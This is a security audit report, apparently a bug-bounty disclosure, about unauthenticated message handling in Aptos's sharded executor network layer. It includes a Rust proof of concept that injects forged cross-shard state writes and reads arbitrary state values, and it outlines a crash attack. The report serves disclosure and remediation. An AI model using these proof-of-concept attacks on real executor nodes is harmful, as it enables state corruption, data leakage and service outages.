# Audit Report

## Title
Unauthorized Network Message Injection in Sharded Executor Service Enables Consensus Violations and State Corruption

## Summary
The `secure/net` module's gRPC network service accepts arbitrary messages from any network peer without authentication or authorization checks. This allows attackers to inject malicious cross-shard messages or request arbitrary state values, breaking the deterministic execution invariant and enabling consensus violations in the sharded block executor system.

## Finding Description

The vulnerability exists in the network message handling layer used by the remote executor service for sharded block execution. The core issue is in the `simple_msg_exchange` function, which accepts incoming network messages and routes them to registered handlers based solely on the `message_type` field, without verifying the sender's identity or authorization. [1](#0-0) 

The function extracts the `message_type` from incoming messages and forwards them to registered handlers without any checks. There is no authentication layer in the entire `secure/net` module - the `NetworkController` is initialized with only basic network parameters. [2](#0-1) 

This vulnerable networking layer is used by the remote executor service for critical operations:

**1. Cross-Shard Message Passing:** The `RemoteCrossShardClient` uses this network to send `CrossShardMsg` messages between shards. [3](#0-2) 

When a cross-shard message arrives, it is processed by `CrossShardCommitReceiver` which directly calls `set_value` on the cross-shard state view without validation. [4](#0-3) 

**2. Remote State Value Requests:** The `RemoteStateViewService` handles "remote_kv_request" messages and returns state values. [5](#0-4) 

**Attack Scenario:**

1. **Cross-Shard Message Injection Attack:**
   - Attacker discovers executor shard addresses (e.g., from configuration or network scanning)
   - Attacker crafts malicious `CrossShardMsg::RemoteTxnWriteMsg` with arbitrary `state_key` and `write_op`
   - Attacker sends message to victim shard using message type "cross_shard_0" (or any round ID)
   - Victim shard deserializes and processes the message, corrupting cross-shard state
   - Transactions depending on this cross-shard state will read the attacker's injected value
   - **Result:** Different shards produce different state roots, violating deterministic execution

2. **State Value Leakage Attack:**
   - Attacker crafts `RemoteKVRequest` with arbitrary state keys
   - Attacker sends to victim shard using message type "remote_kv_request"
   - Victim responds with requested state values
   - **Result:** Unauthorized access to blockchain state data

3. **Denial of Service Attack:**
   - Attacker sends malformed messages or messages with out-of-bounds `shard_id`
   - Victim shard panics (e.g., array index out of bounds at line 121 in remote_state_view_service.rs)
   - **Result:** Executor shard crashes

The root cause is that the executor service creates the `NetworkController` without any authentication mechanism: [6](#0-5) 

## Impact Explanation

This vulnerability has **CRITICAL** severity impact per the Aptos Bug Bounty program:

**Consensus/Safety Violations (up to $1,000,000):**
- An attacker can inject arbitrary cross-shard state values, causing different executor shards to produce different execution results for the same block
- This breaks the fundamental invariant that "All validators must produce identical state roots for identical blocks"
- The attack requires no privileged access - any network peer can connect to the gRPC endpoint
- This could lead to non-recoverable network partitions requiring a hardfork to resolve

**Information Disclosure:**
- Attackers can read arbitrary state values from victim shards, potentially including sensitive account balances, resource data, and other blockchain state

**Denial of Service:**
- Attackers can crash executor shards by sending malformed messages, causing total loss of sharded execution capability

The impact is severe because:
1. It affects the execution layer, which is critical for state transitions
2. It breaks deterministic execution, the most fundamental property of a blockchain
3. It can be exploited remotely without authentication
4. It affects all deployments using sharded execution

## Likelihood Explanation

The likelihood of exploitation is **HIGH**:

**Ease of Discovery:**
- Executor service configuration (IP addresses and ports) may be publicly known or discoverable
- The gRPC service listens on a standard port without authentication
- The vulnerability is straightforward - no complex preconditions required

**Ease of Exploitation:**
- Attacker only needs network connectivity to executor shards
- Message formats are BCS-serialized Rust structures (can be reverse-engineered or obtained from public source)
- No cryptographic operations, signatures, or proof-of-work required
- Simple proof-of-concept can be written in any language with gRPC support

**Likelihood Factors:**
- If sharded execution is deployed in production, this is immediately exploitable
- No special timing or race conditions required
- Attack is repeatable and deterministic
- Multiple attack vectors (injection, leakage, DoS)

The only mitigating factor is that sharded execution may not be widely deployed yet in production environments. However, once deployed, exploitation is trivial.

## Recommendation

Implement comprehensive authentication and authorization for the `secure/net` networking layer:

**1. Add Mutual TLS (mTLS) Authentication:**
- Configure gRPC server to require client certificates
- Validate client certificates against a trusted CA
- Only allow connections from known executor shards

**2. Add Message-Level Authorization:**
- After authentication, verify that the sender is authorized to send the specific message type
- Maintain an access control list mapping authenticated peers to allowed message types
- For cross-shard messages, verify that the sender is the expected source shard

**3. Add Message Signing:**
- Each message should be signed by the sender using their private key
- Verify signatures before processing messages
- Include nonce/timestamp to prevent replay attacks

**Example Fix (Conceptual):**

```rust
// In grpc_network_service/mod.rs
#[tonic::async_trait]
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let remote_addr = request.remote_addr()
            .ok_or_else(|| Status::unauthenticated("No remote address"))?;
        
        // Step 1: Authenticate the peer
        let authenticated_peer = self.authenticate_peer(remote_addr)?;
        
        let network_message = request.into_inner();
        let message_type = MessageType::new(network_message.message_type);
        
        // Step 2: Authorize the message type
        if !self.is_authorized(&authenticated_peer, &message_type) {
            return Err(Status::permission_denied(
                format!("Peer {:?} not authorized for message type {:?}", 
                        authenticated_peer, message_type)
            ));
        }
        
        // Step 3: Verify message signature
        self.verify_message_signature(&network_message, &authenticated_peer)?;
        
        // Step 4: Process the message
        let msg = Message::new(network_message.message);
        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            handler.send(msg).unwrap();
        }
        
        Ok(Response::new(Empty {}))
    }
}
```

**Additional Recommendations:**
- Use the existing Aptos network layer's authentication system instead of `secure/net` if possible
- If `secure/net` must be used, integrate it with Noise protocol for authentication (like the main Aptos network)
- Add rate limiting per authenticated peer
- Log all unauthorized access attempts for security monitoring
- Consider using private network segments for inter-shard communication

## Proof of Concept

```rust
// PoC: Unauthorized Cross-Shard Message Injection
// This demonstrates how an attacker can inject arbitrary cross-shard messages

use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use aptos_types::{
    state_store::state_key::StateKey,
    write_set::WriteOp,
};
use aptos_vm::sharded_block_executor::messages::{CrossShardMsg, RemoteTxnWrite};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Step 1: Connect to victim executor shard (no authentication required!)
    let victim_shard_address = "http://127.0.0.1:8000"; // Example address
    let mut client = NetworkMessageServiceClient::connect(victim_shard_address).await?;
    
    // Step 2: Craft malicious cross-shard message
    let malicious_state_key = StateKey::raw(b"critical_state_key");
    let malicious_write_op = WriteOp::Modification(b"attacker_controlled_value".to_vec().into());
    
    let malicious_msg = CrossShardMsg::RemoteTxnWriteMsg(
        RemoteTxnWrite::new(malicious_state_key, Some(malicious_write_op))
    );
    
    // Step 3: Serialize the malicious message
    let serialized_msg = bcs::to_bytes(&malicious_msg)?;
    
    // Step 4: Send the malicious message (no authentication!)
    let network_message = NetworkMessage {
        message: serialized_msg,
        message_type: "cross_shard_0".to_string(), // Target round 0
    };
    
    let request = tonic::Request::new(network_message);
    let response = client.simple_msg_exchange(request).await?;
    
    println!("Attack successful! Victim processed our malicious message: {:?}", response);
    println!("The victim shard now has corrupted cross-shard state!");
    println!("Transactions depending on this state will execute incorrectly,");
    println!("causing consensus violations and different state roots across shards.");
    
    Ok(())
}

// PoC: State Value Leakage
#[tokio::main]
async fn leak_state_values() -> Result<(), Box<dyn std::error::Error>> {
    use aptos_executor_service::RemoteKVRequest;
    
    let victim_shard_address = "http://127.0.0.1:8000";
    let mut client = NetworkMessageServiceClient::connect(victim_shard_address).await?;
    
    // Request arbitrary state keys
    let sensitive_keys = vec![
        StateKey::raw(b"account_balance_xyz"),
        StateKey::raw(b"sensitive_resource_abc"),
    ];
    
    let request = RemoteKVRequest::new(0, sensitive_keys);
    let serialized = bcs::to_bytes(&request)?;
    
    let network_message = NetworkMessage {
        message: serialized,
        message_type: "remote_kv_request".to_string(),
    };
    
    // Send unauthorized state read request
    let response = client.simple_msg_exchange(tonic::Request::new(network_message)).await?;
    println!("Successfully leaked state values: {:?}", response);
    
    Ok(())
}
```

## Notes

This vulnerability affects the sharded block executor system, which may be an experimental or future feature. However, once deployed, it would have critical impact on consensus safety. The fundamental issue is that the `secure/net` module provides no security mechanisms despite its name, relying entirely on network isolation for protection. This violates defense-in-depth principles and the zero-trust security model that should be applied to blockchain systems.

The vulnerability demonstrates why authentication and authorization must be enforced at the application layer, not just network layer, especially for consensus-critical components.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/mod.rs (L94-113)
```rust
impl NetworkController {
    pub fn new(service: String, listen_addr: SocketAddr, timeout_ms: u64) -> Self {
        let inbound_handler = Arc::new(Mutex::new(InboundHandler::new(
            service.clone(),
            listen_addr,
            timeout_ms,
        )));
        let outbound_handler = OutboundHandler::new(service, listen_addr, inbound_handler.clone());
        info!("Network controller created for node {}", listen_addr);
        Self {
            inbound_handler,
            outbound_handler,
            inbound_rpc_runtime: Runtime::new().unwrap(),
            outbound_rpc_runtime: Runtime::new().unwrap(),
            // we initialize the shutdown handles when we start the network controller
            inbound_server_shutdown_tx: None,
            outbound_task_shutdown_tx: None,
            listen_addr,
        }
    }
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L21-47)
```rust
impl RemoteCrossShardClient {
    pub fn new(controller: &mut NetworkController, shard_addresses: Vec<SocketAddr>) -> Self {
        let mut message_txs = vec![];
        let mut message_rxs = vec![];
        // Create outbound channels for each shard per round.
        for remote_address in shard_addresses.iter() {
            let mut txs = vec![];
            for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
                let message_type = format!("cross_shard_{}", round);
                let tx = controller.create_outbound_channel(*remote_address, message_type);
                txs.push(Mutex::new(tx));
            }
            message_txs.push(txs);
        }

        // Create inbound channels for each round
        for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
            let message_type = format!("cross_shard_{}", round);
            let rx = controller.create_inbound_channel(message_type);
            message_rxs.push(Mutex::new(rx));
        }

        Self {
            message_txs: Arc::new(message_txs),
            message_rxs: Arc::new(message_rxs),
        }
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L25-45)
```rust
impl CrossShardCommitReceiver {
    pub fn start<S: StateView + Sync + Send>(
        cross_shard_state_view: Arc<CrossShardStateView<S>>,
        cross_shard_client: Arc<dyn CrossShardClient>,
        round: RoundId,
    ) {
        loop {
            let msg = cross_shard_client.receive_cross_shard_msg(round);
            match msg {
                RemoteTxnWriteMsg(txn_commit_msg) => {
                    let (state_key, write_op) = txn_commit_msg.take();
                    cross_shard_state_view
                        .set_value(&state_key, write_op.and_then(|w| w.as_state_value()));
                },
                CrossShardMsg::StopMsg => {
                    trace!("Cross shard commit receiver stopped for round {}", round);
                    break;
                },
            }
        }
    }
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L74-122)
```rust
    pub fn handle_message(
        message: Message,
        state_view: Arc<RwLock<Option<Arc<S>>>>,
        kv_tx: Arc<Vec<Sender<Message>>>,
    ) {
        // we don't know the shard id until we deserialize the message, so lets default it to 0
        let _timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&["0", "kv_requests"])
            .start_timer();
        let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&["0", "kv_req_deser"])
            .start_timer();
        let req: RemoteKVRequest = bcs::from_bytes(&message.data).unwrap();
        drop(bcs_deser_timer);

        let (shard_id, state_keys) = req.into();
        trace!(
            "remote state view service - received request for shard {} with {} keys",
            shard_id,
            state_keys.len()
        );
        let resp = state_keys
            .into_iter()
            .map(|state_key| {
                let state_value = state_view
                    .read()
                    .unwrap()
                    .as_ref()
                    .unwrap()
                    .get_state_value(&state_key)
                    .unwrap();
                (state_key, state_value)
            })
            .collect_vec();
        let len = resp.len();
        let resp = RemoteKVResponse::new(resp);
        let bcs_ser_timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&["0", "kv_resp_ser"])
            .start_timer();
        let resp = bcs::to_bytes(&resp).unwrap();
        drop(bcs_ser_timer);
        trace!(
            "remote state view service - sending response for shard {} with {} keys",
            shard_id,
            len
        );
        let message = Message::new(resp);
        kv_tx[shard_id].send(message).unwrap();
    }
```

**File:** execution/executor-service/src/remote_executor_service.rs (L21-54)
```rust
impl ExecutorService {
    pub fn new(
        shard_id: ShardId,
        num_shards: usize,
        num_threads: usize,
        self_address: SocketAddr,
        coordinator_address: SocketAddr,
        remote_shard_addresses: Vec<SocketAddr>,
    ) -> Self {
        let service_name = format!("executor_service-{}", shard_id);
        let mut controller = NetworkController::new(service_name, self_address, 5000);
        let coordinator_client = Arc::new(RemoteCoordinatorClient::new(
            shard_id,
            &mut controller,
            coordinator_address,
        ));
        let cross_shard_client = Arc::new(RemoteCrossShardClient::new(
            &mut controller,
            remote_shard_addresses,
        ));

        let executor_service = Arc::new(ShardedExecutorService::new(
            shard_id,
            num_shards,
            num_threads,
            coordinator_client,
            cross_shard_client,
        ));

        Self {
            shard_id,
            controller,
            executor_service,
        }
```
